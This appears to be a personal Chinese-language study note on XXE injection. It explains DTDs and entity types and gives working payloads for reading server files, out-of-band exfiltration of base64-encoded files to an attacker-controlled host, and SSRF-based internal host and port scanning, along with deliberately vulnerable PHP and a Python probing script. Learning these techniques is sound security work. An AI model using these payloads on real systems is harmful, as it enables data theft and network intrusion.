## XXE-XML External Entity Injection

#### 0x01前置知识

XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

XML文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的

```xml-dtd
//DTD example code
//内部DTD基本语法  <!DOCTYPE 根元素 [元素声明]>
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe "test" >]>         //内部实体声明

//外部DTD基本语法 <!DOCTYPE 根元素 SYSTEM "文件名">
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "note.dtd">
<note>
<to>George</to>
<from>John</from>
<heading>Reminder</heading>
<body>Don't forget the meeting!</body>
</note> 

//note.dtd
<!ELEMENT note (to,from,heading,body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT heading (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

这里内部DTD定义元素为 ANY 说明接受任何元素，定义了一个 xml 的实体（实体其实可以看成一个变量，到时候我们可以在 XML 中通过 & 符号进行引用）

因此XML可以写成这样

```xml
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>

//使用 &xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &xxe 就会被 "test" 替换。
```

**重点**

**1.实体分为内部实体和外部实体**，上面的例子是内部实体，但是实际上可以从外部的DTD文件引用实体（外部实体）

```xml-dtd
//内部实体声明语法：
<!ENTITY 实体名称 "实体的值">

//example见上

//外部实体声明语法
<!ENTITY 实体名称 SYSTEM "URI/URL">

//example
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/test.dtd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>


```

这样对引用的外部实体资源所做的任何更改都会在XML文档中在自动更新

还有一种引用方式可以引用公用DTD，语法如下

```
<!DOCTYPE 根元素名称 PUBLIC  “DTD标识名”  “公用DTD的URI”>
//统一资源标志符（URI）在电脑术语中是用于标志某一互联网资源名称的字符串。URI可被视为定位符（URL），名称（URN）或两者兼备。
```

**2.从另一个角度实体可以分为通用实体和参数实体**

- 通用实体

用 &实体名; 引用的实体，在DTD 中定义，在 XML 文档中引用

```xml-dtd
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE updateProfile [<!ENTITY file SYSTEM "file:///c:/windows/win.ini"> ]> 
<updateProfile>  
    <firstname>Joe</firstname>  
    <lastname>&file;</lastname>  
    ... 
</updateProfile>
```

- 参数实体

1. )使用 `% 实体名`(**这里面空格不能少**) 在 DTD 中定义，并且只能在 DTD 中使用 `%实体名;` 引用，同时引用是解析的，替换文本变成DTD的一部分
2. 和通用实体一样，参数实体也可以外部引用
3. 只有在 DTD 文件中，参数实体的声明才能引用其他实体

```xml-dtd
<!ENTITY % an-element "<!ELEMENT mytag (subtag)>"> 
<!ENTITY % remote-dtd SYSTEM "http://somewhere.example.org/remote.dtd"> 
%an-element; %remote-dtd;   //在DTD中引用
```

**3.不同程序支持的协议不同**

- LIBXML2：file,http,ftp
- PHP:file http ftp php cpmpress.zlib compress.bzip2 data glob phar
- Java:http https ftp file jar netdoc mailto gopher
- .NET:file http https ftp

### 0x02XXE利用

### **1.有回显读取本地敏感文件**

服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件

```
//服务器上xml.php

<?php

    libxml_disable_entity_loader (false);
    $xmlfile = file_get_contents('php://input');
    $dom = new DOMDocument();
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom);
    echo $creds;

?>
```

payload：

```
//post传入到://input

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE creds [  
<!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"> ]> 
<creds>&goodies;</creds>
```

但是如果读取的文件中包括有&,<,>,",'的字符时，会被xml解析器解析，报错从而导致读取失败那么如何解决呢？

**PCDATA**

PCDATA 指的是被解析的字符数据（Parsed Character Data）。

XML 解析器通常会解析 XML 文档中所有的文本。

**CDATA**

术语 CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data）。

在XML元素中，"<"和“&”是非法的，但是某些文本比如JavaScript代码包含大量的"<"和“&”字符。

为了避免错误，可以将脚本代码定义为CDATA。

CDATA 部分中的所有内容都会被解析器忽略。

CDATA 部分由 "<![CDATA[" 开始，由 "]]>" 结束

**因此思路就是把读取的文件放在CDATA之后在调用**

payload

需要将三个字符串实体使用参数实体拼接(不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用)

```xml-dtd
//POST DATA

<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///d:/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://ip/evil.dtd"> 
%dtd; ]> 
<roottag>&all;</roottag>
```

```
//http://ip/evil.dtd

<?xml version="1.0" encoding="UTF-8"?> 
<!ENTITY all "%start;%goodies;%end;">
```

### **2.无回显**--外带

xml.php

```php
<?php

libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
?>
```

test.dtd

```xml-dtd
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///D:/test.txt">
<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'http://ip:9999?p=%file;'>">   //vps ip
//&#37;就是%html实体编码结果
```

POST-payload

```
<!DOCTYPE convert [ 
<!ENTITY % remote SYSTEM "http://ip/test.dtd">        //服务器ip
%remote;%int;%send;
]>
```

调用过程

- %remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来
- %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `%`)
- 我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。

### 3.拓展

可以让服务器让另一台服务器发送请求，如果像内网服务器发送请求，可以实现SSRF的效果。

利用这种攻击模式可以使用很多的协议和漏洞攻击。

**2.3.1HTTP内网主机探测**

以存在 XXE 漏洞的服务器为我们探测内网的支点

- 要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子。
- 以linux为例，可以读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了

探测脚本实例

```python
import requests
import base64

#Origtional XML that the server accepts
#<xml>
#    <stuff>user</stuff>
#</xml>


def build_xml(string):
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>"""
    xml = xml + "\r\n" + """<!DOCTYPE foo [ <!ELEMENT foo ANY >"""
    xml = xml + "\r\n" + """<!ENTITY xxe SYSTEM """ + '"' + string + '"' + """>]>"""
    xml = xml + "\r\n" + """<xml>"""
    xml = xml + "\r\n" + """    <stuff>&xxe;</stuff>"""
    xml = xml + "\r\n" + """</xml>"""
    send_xml(xml)

def send_xml(xml):
    headers = {'Content-Type': 'application/xml'}
    x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
    coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
    print coded_string
#   print base64.b64decode(coded_string)
for i in range(1, 255):
    try:
        i = str(i)
        ip = '10.0.0.' + i
        string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
        print string
        build_xml(string)
    except:
continue
```

**2.3.2HTTP内网主机端口扫描**

探测内网主机以后，还可以用类似的方法实现端口扫描

比如传入

```xml
<?xml version="1.0" encoding="utf-8"?>  
<!DOCTYPE data SYSTEM "http://127.0.0.1:515/" [  
<!ELEMENT data (#PCDATA)>  
]>
<data>4</data>
```

可以使用bp-intruder-Sniper

![image-20230720114526152](C:\Users\spdadi\AppData\Roaming\Typora\typora-user-images\image-20230720114526152.png)

MORE

等php水平提高一些 and 学一学XML再继续

实现盲注 文件上传 钓鱼 DOS RCE...







 [XXE漏洞详解 - 清茶先生 - 博客园.url](..\..\..\XXE漏洞详解 - 清茶先生 - 博客园.url)  [(5条消息) XXE漏洞详解（全网最详细）_xxe漏洞成因_貌美不及玲珑心，贤妻扶我青云志的博客-CSDN博客.url](..\..\..\(5条消息) XXE漏洞详解（全网最详细）_xxe漏洞成因_貌美不及玲珑心，贤妻扶我青云志的博客-CSDN博客.url)  [一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区.url](..\..\..\一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区.url)  [绕过WAF保护的XXE - 先知社区.url](..\..\..\绕过WAF保护的XXE - 先知社区.url) 
